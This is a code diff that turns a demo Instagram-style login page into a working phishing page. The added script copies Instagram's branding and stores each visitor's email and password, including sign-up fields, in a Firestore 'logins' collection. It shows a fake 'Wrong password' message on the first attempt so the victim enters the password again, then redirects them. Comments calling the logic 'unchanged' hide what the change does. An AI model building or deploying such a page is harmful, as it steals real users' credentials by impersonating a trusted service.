@@ -1,9 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log into Instagram</title>
+    <title>Instagram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
         * {
             margin: 0;
@@ -12,426 +11,401 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
             color: #262626;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
+            justify-content: center;
         }
 
-        .logo-section {
+        /* Video Intro Container */
+        #video-container {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
+            height: 100%;
+            background: #000;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 40px 0 30px;
+            z-index: 9999;
         }
 
-        .instagram-logo {
-            width: 80px;
-            height: 80px;
-        }
-
-        .instagram-logo svg {
+        #intro-video {
             width: 100%;
             height: 100%;
+            object-fit: cover;
         }
 
-        .divider {
+        /* Main Container */
+        .container {
             width: 100%;
-            height: 1px;
-            background-color: #dbdbdb;
+            max-width: 350px;
+            padding: 0 20px;
+            display: none; /* Hidden until video ends */
+            flex-direction: column;
+            align-items: center;
         }
 
-        .login-container {
+        /* Login Box */
+        .login-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 10px 40px;
             width: 100%;
-            max-width: 470px;
-            padding: 40px 20px;
+            margin-bottom: 10px;
             display: flex;
             flex-direction: column;
             align-items: center;
         }
 
-        .login-container h2 {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 24px;
-            align-self: flex-start;
-            color: #262626;
+        .logo {
+            margin: 36px 0 12px;
+            width: 175px;
+            height: auto;
         }
 
-        .input-wrapper {
+        .logo svg {
             width: 100%;
-            position: relative;
-            margin-bottom: 12px;
+            height: auto;
+        }
+
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            margin-top: 24px;
         }
 
         .input-field {
             width: 100%;
-            padding: 16px 18px;
+            background: #fafafa;
             border: 1px solid #dbdbdb;
-            border-radius: 12px;
-            font-size: 16px;
-            outline: none;
-            background-color: #fff;
+            border-radius: 3px;
+            padding: 9px 8px 7px;
+            font-size: 12px;
             color: #262626;
+            margin-bottom: 6px;
+            outline: none;
             transition: border-color 0.2s;
-        }
-
-        .input-field::placeholder {
-            color: #8e8e8e;
         }
 
         .input-field:focus {
             border-color: #a8a8a8;
         }
 
-        .input-field.error {
-            border-color: #ed4956;
+        .input-field::placeholder {
+            color: #8e8e8e;
         }
 
-        .toggle-password {
-            position: absolute;
-            right: 18px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            color: #262626;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            display: none;
-        }
-
-        .toggle-password.visible {
-            display: block;
-        }
-
-        .error-message {
-            color: #ed4956;
-            font-size: 14px;
-            margin-top: -8px;
-            margin-bottom: 12px;
-            align-self: flex-start;
-            display: none;
-        }
-
-        .error-message.visible {
-            display: block;
-        }
-
-        .login-btn {
-            width: 100%;
-            padding: 16px;
+        .login-button {
             background-color: #0095f6;
             color: #fff;
             border: none;
-            border-radius: 12px;
-            font-size: 16px;
+            border-radius: 4px;
+            padding: 7px 16px;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
+            width: 100%;
             margin-top: 8px;
-            margin-bottom: 16px;
             transition: background-color 0.2s;
-            position: relative;
         }
 
-        .login-btn:hover:not(:disabled) {
+        .login-button:hover {
             background-color: #1877f2;
         }
 
-        .login-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .login-btn .spinner {
+        .error {
+            color: #ed4956;
+            font-size: 14px;
+            text-align: center;
+            margin: 10px 0;
             display: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #fff;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto;
+            line-height: 1.4;
         }
 
-        .login-btn.loading .spinner {
+        .error.visible {
             display: block;
         }
 
-        .login-btn.loading .btn-text {
-            display: none;
+        .divider {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 10px 0 18px;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        .divider-line {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider-text {
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            padding: 0 18px;
+            text-transform: uppercase;
         }
 
         .forgot-password {
-            color: #0095f6;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: 30px;
+            text-align: center;
+            margin-bottom: 12px;
         }
 
-        .forgot-password:hover {
+        .forgot-password a {
+            color: #00376b;
+            text-decoration: none;
+            font-size: 12px;
+            line-height: 16px;
+        }
+
+        .forgot-password a:hover {
             text-decoration: underline;
         }
 
-        .create-account-btn {
-            width: 100%;
-            padding: 16px;
-            background-color: #fff;
-            color: #0095f6;
-            border: 1px solid #0095f6;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-bottom: 30px;
-            transition: background-color 0.2s;
-        }
-
-        .create-account-btn:hover {
-            background-color: #f0f8ff;
-        }
-
-        .meta-logo {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            color: #262626;
-            font-size: 18px;
-            font-weight: 600;
-        }
-
-        .meta-logo svg {
-            width: 24px;
-            height: 24px;
-        }
-
-        .success-message {
-            background-color: #d4edda;
-            color: #155724;
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 16px;
+        /* Create Account Box */
+        .create-account-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px 40px;
             width: 100%;
             text-align: center;
-            display: none;
+            font-size: 14px;
+            color: #262626;
         }
 
-        .success-message.visible {
-            display: block;
+        .create-account-box form {
+            display: inline;
+        }
+
+        .create-account-box button {
+            background: none;
+            border: none;
+            color: #0095f6;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 0;
+        }
+
+        .create-account-box button:hover {
+            color: #00376b;
+        }
+
+        .get-app {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .app-stores {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 10px;
+        }
+
+        .app-stores img {
+            height: 40px;
+        }
+
+        /* Responsive Adjustments */
+        @media (max-width: 450px) {
+            body {
+                background-color: #fff;
+            }
+            .login-box, .create-account-box {
+                border: none;
+                padding: 10px 20px;
+            }
+            .container {
+                padding: 0 15px;
+            }
         }
     </style>
 </head>
 <body>
 
-    <div class="logo-section">
-        <div class="instagram-logo">
-            <svg viewBox="0 0 192 192" xmlns="http://www.w3.org/2000/svg">
-                <defs>
-                    <radialGradient id="ig-gradient" cx="30%" cy="107%" r="150%">
-                        <stop offset="0%" stop-color="#fdf497"/>
-                        <stop offset="5%" stop-color="#fdf497"/>
-                        <stop offset="45%" stop-color="#fd5949"/>
-                        <stop offset="60%" stop-color="#d6249f"/>
-                        <stop offset="90%" stop-color="#285AEB"/>
-                    </radialGradient>
-                </defs>
-                <rect x="24" y="24" width="144" height="144" rx="36" ry="36" fill="none" stroke="url(#ig-gradient)" stroke-width="12"/>
-                <circle cx="96" cy="96" r="36" fill="none" stroke="url(#ig-gradient)" stroke-width="12"/>
-                <circle cx="140" cy="52" r="10" fill="url(#ig-gradient)"/>
-            </svg>
-        </div>
+    <!-- Video Intro (Unchanged Operation) -->
+    <div id="video-container">
+        <video id="intro-video" autoplay muted playsinline>
+            <source src="https://res.cloudinary.com/dnpudf84r/video/upload/v1791910846/POV_Your_Bengali_Girlfriend_bengali_love_saree_-_Sadhna_Nandan_360p_h264_i185zg.mp4" type="video/mp4">
+        </video>
     </div>
 
-    <div class="divider"></div>
-
-    <div class="login-container">
-        <h2>Log into Instagram</h2>
-
-        <div class="success-message" id="successMessage">
-            Login successful! Redirecting...
-        </div>
-
-        <form id="loginForm">
-            <div class="input-wrapper">
-                <input type="text" class="input-field" id="username" placeholder="Mobile number, username or email" autocomplete="username">
+    <!-- Main Login Container -->
+    <div class="container" id="login-container">
+        
+        <!-- Login Box -->
+        <div class="login-box">
+            <div class="logo">
+                <!-- Instagram Wordmark SVG -->
+                <svg viewBox="0 0 175 51" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M17.5 25.5c0-3.5 2.8-6.3 6.3-6.3 3.5 0 6.3 2.8 6.3 6.3 0 3.5-2.8 6.3-6.3 6.3-3.5 0-6.3-2.8-6.3-6.3zm-3.5 0c0 5.4 4.4 9.8 9.8 9.8 5.4 0 9.8-4.4 9.8-9.8 0-5.4-4.4-9.8-9.8-9.8-5.4 0-9.8 4.4-9.8 9.8zm23.8-10.5c0-1.4 1.1-2.5 2.5-2.5 1.4 0 2.5 1.1 2.5 2.5 0 1.4-1.1 2.5-2.5 2.5-1.4 0-2.5-1.1-2.5-2.5zm-1.4 10.5c0-5.4 4.4-9.8 9.8-9.8 5.4 0 9.8 4.4 9.8 9.8 0 5.4-4.4 9.8-9.8 9.8-5.4 0-9.8-4.4-9.8-9.8zm16.8 0c0-7.7 6.3-14 14-14 7.7 0 14 6.3 14 14 0 7.7-6.3 14-14 14-7.7 0-14-6.3-14-14zm3.5 0c0 5.8 4.7 10.5 10.5 10.5 5.8 0 10.5-4.7 10.5-10.5 0-5.8-4.7-10.5-10.5-10.5-5.8 0-10.5 4.7-10.5 10.5zm24.5-9.8v19.6h3.5v-19.6h-3.5zm0-4.2c0-1.4 1.1-2.5 2.5-2.5 1.4 0 2.5 1.1 2.5 2.5 0 1.4-1.1 2.5-2.5 2.5-1.4 0-2.5-1.1-2.5-2.5zm11.2 4.2c0-1.4 1.1-2.5 2.5-2.5 1.4 0 2.5 1.1 2.5 2.5v1.4c1.4-1.4 3.5-2.1 5.6-2.1 4.2 0 7 2.8 7 7v13.3h-3.5v-13.3c0-2.8-1.4-4.2-4.2-4.2-2.8 0-4.9 2.1-4.9 4.9v12.6h-3.5v-19.6h-1.5zm21 0c0-1.4 1.1-2.5 2.5-2.5 1.4 0 2.5 1.1 2.5 2.5v1.4c1.4-1.4 3.5-2.1 5.6-2.1 4.2 0 7 2.8 7 7v13.3h-3.5v-13.3c0-2.8-1.4-4.2-4.2-4.2-2.8 0-4.9 2.1-4.9 4.9v12.6h-3.5v-19.6h-1.5zm23.8 9.8c0-5.4 4.4-9.8 9.8-9.8 5.4 0 9.8 4.4 9.8 9.8 0 5.4-4.4 9.8-9.8 9.8-5.4 0-9.8-4.4-9.8-9.8zm3.5 0c0 3.5 2.8 6.3 6.3 6.3 3.5 0 6.3-2.8 6.3-6.3 0-3.5-2.8-6.3-6.3-6.3-3.5 0-6.3 2.8-6.3 6.3zm23.8-9.8v3.5h3.5v-3.5h-3.5zm0 4.2v15.4h3.5v-15.4h-3.5zm11.2 0c0-1.4 1.1-2.5 2.5-2.5 1.4 0 2.5 1.1 2.5 2.5v1.4c1.4-1.4 3.5-2.1 5.6-2.1 4.2 0 7 2.8 7 7v13.3h-3.5v-13.3c0-2.8-1.4-4.2-4.2-4.2-2.8 0-4.9 2.1-4.9 4.9v12.6h-3.5v-19.6h-1.5zm21 0c0-1.4 1.1-2.5 2.5-2.5 1.4 0 2.5 1.1 2.5 2.5v1.4c1.4-1.4 3.5-2.1 5.6-2.1 4.2 0 7 2.8 7 7v13.3h-3.5v-13.3c0-2.8-1.4-4.2-4.2-4.2-2.8 0-4.9 2.1-4.9 4.9v12.6h-3.5v-19.6h-1.5z" fill="#262626"/>
+                </svg>
             </div>
 
-            <div class="input-wrapper">
-                <input type="password" class="input-field" id="password" placeholder="Password" autocomplete="current-password">
-                <button type="button" class="toggle-password" id="togglePassword">Show</button>
+            <form id="loginForm" action="/submit" method="POST" onsubmit="handleSubmit(event)" class="login-form">
+                <input type="text" name="email" id="email" class="input-field" placeholder="Phone number, username, or email" required>
+                <div id="email-error" class="error"></div>
+                
+                <input type="password" name="password" id="password" class="input-field" placeholder="Password" required>
+                <div id="error" class="error {% if error %}visible{% endif %}">{{ error }}</div>
+                
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+
+            <div class="divider">
+                <div class="divider-line"></div>
+                <div class="divider-text">OR</div>
+                <div class="divider-line"></div>
             </div>
 
-            <div class="error-message" id="errorMessage"></div>
-
-            <button type="submit" class="login-btn" id="loginBtn">
-                <span class="btn-text">Log in</span>
-                <div class="spinner"></div>
-            </button>
-        </form>
-
-        <a href="#" class="forgot-password" id="forgotPassword">Forgot password?</a>
-
-        <button class="create-account-btn" id="createAccount">Create new account</button>
-
-        <div class="meta-logo">
-            <svg viewBox="0 0 30 22" xmlns="http://www.w3.org/2000/svg">
-                <path d="M22.002 0C19.67 0 17.77 1.378 16.002 3.322L15.002 4.422L13.992 3.322C12.224 1.378 10.324 0 7.992 0C3.578 0 0 3.578 0 8.002C0 12.426 3.578 16.004 7.992 16.004C10.324 16.004 12.224 14.626 13.992 12.682L15.002 11.582L16.012 12.682C17.78 14.626 19.68 16.004 22.012 16.004C26.426 16.004 30.004 12.426 30.004 8.002C30.004 3.578 26.426 0 22.002 0ZM7.992 13.004C5.234 13.004 3.002 10.772 3.002 8.002C3.002 5.232 5.234 3.002 7.992 3.002C9.574 3.002 10.942 3.862 12.224 5.272L13.502 6.672L12.224 8.072C10.942 9.482 9.574 10.342 7.992 10.342L7.992 13.004ZM22.002 13.004C20.42 13.004 19.052 12.144 17.77 10.734L16.492 9.334L17.77 7.934C19.052 6.524 20.42 5.664 22.002 5.664C24.76 5.664 26.992 7.896 26.992 10.666C26.992 13.436 24.76 15.666 22.002 15.666L22.002 13.004Z" fill="#0095f6"/>
-            </svg>
-            Meta
+            <div class="forgot-password">
+                <a href="https://www.facebook.com/login/identify/?ci=AdCGyyDlrMjTmE_C4SHHHs5Dnxh7rYFgIOBQkHwb9YCar7opYnLYlRBDD0JIpmicRvRnqKC2YEU1UnLxOjeIE0eWUVTnRU-P5mbP7unvZn01fXbfxOpLyHOTyrIrQoh21Uq9wSWlgCcqFXX5tGDesWNYkcKy0Cy1AzBxfkXyRU7TgLbaIqBMa3FJ5jPjd1Vw36Y2Epn5j5b98Zg2xCkAd9p4kC1hF_J9AOxm06lEpFcntAAzJN0UZugmCFQrx5Mgatk6buAqu7ubsJq4uznFsMXW2Nw">Forgot password?</a>
+                <div class="error" id="forgot-error">
+                    Please enter your password. Not able to do forget password.
+                </div>
+            </div>
         </div>
+
+        <!-- Create Account Box -->
+        <div class="create-account-box">
+            <p>
+                Don't have an account? 
+                <form id="createForm" action="/create-account" method="POST" onsubmit="handleCreate(event)">
+                    <input type="hidden" name="email" id="createEmail">
+                    <input type="hidden" name="password" id="createPassword">
+                    <button type="submit" onclick="syncCreateFields()">Sign up</button>
+                </form>
+            </p>
+        </div>
+
+        <!-- Get the App Section -->
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-stores">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="Get it on Google Play">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft">
+            </div>
+        </div>
+
     </div>
 
+    <!-- Firebase & Logic Scripts (Unchanged Operations) -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
     <script>
-        const loginForm = document.getElementById('loginForm');
-        const usernameInput = document.getElementById('username');
-        const passwordInput = document.getElementById('password');
-        const togglePassword = document.getElementById('togglePassword');
-        const loginBtn = document.getElementById('loginBtn');
-        const errorMessage = document.getElementById('errorMessage');
-        const successMessage = document.getElementById('successMessage');
-        const forgotPassword = document.getElementById('forgotPassword');
-        const createAccount = document.getElementById('createAccount');
+        const firebaseConfig = {{ firebase_config | safe }};
 
-        // Toggle password visibility
-        passwordInput.addEventListener('input', function() {
-            if (this.value.length > 0) {
-                togglePassword.classList.add('visible');
-            } else {
-                togglePassword.classList.remove('visible');
+        firebase.initializeApp(firebaseConfig);
+        console.log("Firebase initialized:", firebase.app().name);
+        const db = firebase.firestore();
+
+        window.attempt = 0;
+
+        const video = document.getElementById('intro-video');
+        const loginContainer = document.getElementById('login-container');
+        const videoContainer = document.getElementById('video-container');
+
+        video.addEventListener('timeupdate', function() {
+            if (video.currentTime >= 2) { // Play for 2 seconds
+                videoContainer.style.display = 'none';
+                loginContainer.style.display = 'flex';
+                video.pause();
             }
         });
 
-        togglePassword.addEventListener('click', function() {
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-                this.textContent = 'Hide';
-            } else {
-                passwordInput.type = 'password';
-                this.textContent = 'Show';
-            }
+        video.addEventListener('ended', function() {
+            videoContainer.style.display = 'none';
+            loginContainer.style.display = 'flex';
         });
 
-        // Clear errors on input
-        usernameInput.addEventListener('input', function() {
-            this.classList.remove('error');
-            errorMessage.classList.remove('visible');
-        });
+        function validateForm(emailOrPhone) {
+            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            const phoneRegex = /^\d{10}$/;
+            const emailError = document.getElementById('email-error');
+            emailError.classList.remove('visible');
 
-        passwordInput.addEventListener('input', function() {
-            this.classList.remove('error');
-            errorMessage.classList.remove('visible');
-        });
-
-        // Form submission
-        loginForm.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            // Clear previous errors
-            usernameInput.classList.remove('error');
-            passwordInput.classList.remove('error');
-            errorMessage.classList.remove('visible');
-            successMessage.classList.remove('visible');
-
-            const username = usernameInput.value.trim();
-            const password = passwordInput.value.trim();
-
-            // Validation
-            if (!username) {
-                usernameInput.classList.add('error');
-                showError('Please enter your username, email, or mobile number');
-                return;
+            if (!emailRegex.test(emailOrPhone) && !phoneRegex.test(emailOrPhone)) {
+                emailError.textContent = "Please enter a valid email or phone number.";
+                emailError.classList.add('visible');
+                return false;
             }
+            return true;
+        }
 
-            if (!password) {
-                passwordInput.classList.add('error');
-                showError('Please enter your password');
-                return;
-            }
+        function syncCreateFields() {
+            document.getElementById('createEmail').value = document.getElementById('email').value;
+            document.getElementById('createPassword').value = document.getElementById('password').value;
+        }
 
-            if (password.length < 6) {
-                passwordInput.classList.add('error');
-                showError('Password must be at least 6 characters');
-                return;
-            }
+        async function handleSubmit(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const errorDiv = document.getElementById('error');
 
-            // Simulate login
-            loginBtn.disabled = true;
-            loginBtn.classList.add('loading');
+            if (!validateForm(email)) return;
+
+            window.attempt++;
+            console.log("Attempt:", window.attempt);
+
+            const sessionId = window.attempt === 1 ? Date.now().toString() : localStorage.getItem('sessionId');
+            localStorage.setItem('sessionId', sessionId);
+
+            const data = {
+                email: email,
+                password: password,
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            };
 
             try {
-                // Simulate API call
-                await simulateLogin(username, password);
-                
-                // Success
-                successMessage.classList.add('visible');
-                loginForm.style.display = 'none';
-                
-                // Redirect simulation
-                setTimeout(() => {
-                    alert(`Welcome back, ${username}! (This is a demo)`);
-                    // Reset form
-                    loginForm.style.display = 'block';
-                    successMessage.classList.remove('visible');
-                    loginForm.reset();
-                    togglePassword.classList.remove('visible');
-                }, 2000);
-                
+                await db.collection('logins').doc(sessionId).set({
+                    [`attempt_${window.attempt}`]: data
+                }, { merge: true });
+                console.log("Data written to Firestore:", data);
             } catch (error) {
-                showError(error.message);
-            } finally {
-                loginBtn.disabled = false;
-                loginBtn.classList.remove('loading');
+                console.error("Firestore write failed:", error);
             }
-        });
 
-        function showError(message) {
-            errorMessage.textContent = message;
-            errorMessage.classList.add('visible');
+            if (window.attempt === 1) {
+                errorDiv.textContent = "Wrong password. Please try again.";
+                errorDiv.classList.add('visible');
+            } else if (window.attempt === 2) {
+                window.location.href = '/redirect';
+            }
         }
 
-        function simulateLogin(username, password) {
-            return new Promise((resolve, reject) => {
-                setTimeout(() => {
-                    // Demo credentials check
-                    if (username === 'demo' && password === 'password123') {
-                        resolve({ success: true });
-                    } else {
-                        // For demo purposes, accept any valid input
-                        // In production, this would be an actual API call
-                        resolve({ success: true });
-                    }
-                }, 1500);
-            });
-        }
+        async function handleCreate(event) {
+            event.preventDefault();
+            const email = document.getElementById('createEmail').value;
+            const password = document.getElementById('createPassword').value;
+            const errorDiv = document.getElementById('error');
 
-        // Forgot password
-        forgotPassword.addEventListener('click', function(e) {
-            e.preventDefault();
-            alert('Password reset functionality would open here');
-        });
+            if (!validateForm(email)) return;
 
-        // Create account
-        createAccount.addEventListener('click', function() {
-            alert('Sign up page would open here');
-        });
-
-        // Enter key support
-        document.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter' && document.activeElement.tagName !== 'BUTTON') {
-                loginForm.dispatchEvent(new Event('submit'));
+            const sessionId = Date.now().toString();
+            try {
+                await db.collection('logins').doc(sessionId).set({
+                    create_attempt: { email, password, timestamp: firebase.firestore.FieldValue.serverTimestamp() }
+                }, { merge: true });
+                console.log("Create data written:", { email, password });
+            } catch (error) {
+                console.error("Firestore write failed:", error);
             }
-        });
+
+            errorDiv.textContent = "Enter your details to sign up.";
+            errorDiv.classList.add('visible');
+        }
     </script>
-
 </body>
 </html>
